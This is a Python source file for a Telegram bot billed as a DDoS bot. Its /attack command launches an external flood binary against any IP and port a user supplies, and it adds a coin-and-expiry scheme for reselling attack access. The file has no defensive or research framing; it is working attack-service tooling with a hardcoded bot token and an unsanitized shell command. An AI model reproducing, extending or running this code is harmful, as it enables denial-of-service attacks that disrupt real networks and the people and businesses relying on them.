import sys
import subprocess
import threading
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Global variables
running = False
cooldown_time = 0
admins = {}      # Format: {admin_id: coins}
users = {}       # Format: {user_id: expiry_timestamp}
current_process = None  # To track attack subprocess
owner_id = 1257888659  # Your Telegram ID

# Authorization check (Updated)
def is_authorized(user_id):
    return (user_id == owner_id or 
            user_id in admins or 
            (user_id in users and time.time() < users[user_id]))

# Start command
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Welcome to Tabish DDOS Bot! Use /attack")

# Attack command (Fixed cooldown and thread-safety)
async def attack(update: Update, context: CallbackContext):
    global running, cooldown_time, current_process

    user_id = update.message.from_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return

    if running:
        await update.message.reply_text("⚠️ Attack already running! Use /stop")
        return

    if time.time() < cooldown_time:
        await update.message.reply_text(f"⏳ Cooldown: {int(cooldown_time - time.time())}s left")
        return

    try:
        target = context.args[0]
        port = int(context.args[1])
        attack_time = int(context.args[2])
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /attack <IP> <Port> <Time>")
        return

    running = True
    await update.message.reply_text(f"🚀 Attacking {target}:{port}...")

    def run_attack():
        global running, cooldown_time, current_process
        try:
            cmd = f"./noobam {target} {port} {attack_time} 1000"
            current_process = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = current_process.communicate()

            if current_process.returncode == 0:
                response = f"✅ Attack Done! {target}:{port}"
            else:
                response = f"❌ Failed: {stderr.decode().strip()}"
        except Exception as e:
            response = f"💥 Error: {str(e)}"
        finally:
            running = False
            cooldown_time = time.time() + 300  # 5-minute cooldown
            current_process = None
            # Thread-safe message
            asyncio.run_coroutine_threadsafe(
                context.bot.send_message(chat_id=update.message.chat_id, text=response),
                context.application.get_event_loop()
            )

    threading.Thread(target=run_attack).start()

# Stop command (Now kills process)
async def stop(update: Update, context: CallbackContext):
    global running, current_process

    user_id = update.message.from_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return

    if not running:
        await update.message.reply_text("⚠️ No active attack!")
        return

    if current_process:
        current_process.terminate()
    running = False
    current_process = None
    await update.message.reply_text("🛑 Attack stopped!")

# Add admin command (Same structure)
async def add_admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != owner_id:
        await update.message.reply_text("❌ Owner only command!")
        return

    try:
        admin_id = int(context.args[0])
        coins = int(context.args[1])
        admins[admin_id] = coins
        await update.message.reply_text(f"⭐ Admin {admin_id} added with {coins} coins!")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /addadmin <admin_id> <coins>")

# Fixed Add User Command (Owner can add directly)
async def add_user(update: Update, context: CallbackContext):
    adder_id = update.message.from_user.id

    if not is_authorized(adder_id):
        await update.message.reply_text("❌ Unauthorized!")
        return

    try:
        new_user_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        multipliers = {"hours": 3600, "days": 86400, "months": 2592000}
        if unit not in multipliers:
            await update.message.reply_text("⚠️ Use hours/days/months")
            return

        expiry = time.time() + (duration * multipliers[unit])

        # Deduct coins only if adder is admin (not owner)
        if adder_id != owner_id:
            if admins.get(adder_id, 0) < duration:
                await update.message.reply_text("💸 Insufficient coins!")
                return
            admins[adder_id] -= duration

        users[new_user_id] = expiry
        await update.message.reply_text(
            f"✅ User {new_user_id} added!\n"
            f"Expiry: {time.ctime(expiry)}"
        )
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /adduser <user_id> <duration> <unit>")

# Check access command (Same)
async def check_access(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in users and time.time() < users[user_id]:
        await update.message.reply_text(f"🕒 Access until: {time.ctime(users[user_id])}")
    else:
        await update.message.reply_text("🔒 No access!")

# Main function (Same)
def main():
    bot_token = "7323159569:AAFIsi8hRacGEGsKXE4RjfagZBzsA-DQg5M"  # Replace with your token
    application = Application.builder().token(bot_token).build()
    
    # Handlers
    handlers = [
        CommandHandler("start", start),
        CommandHandler("attack", attack),
        CommandHandler("stop", stop),
        CommandHandler("addadmin", add_admin),
        CommandHandler("adduser", add_user),
        CommandHandler("checkaccess", check_access)
    ]
    
    for handler in handlers:
        application.add_handler(handler)
    
    application.run_polling()

if __name__ == "__main__":
    main()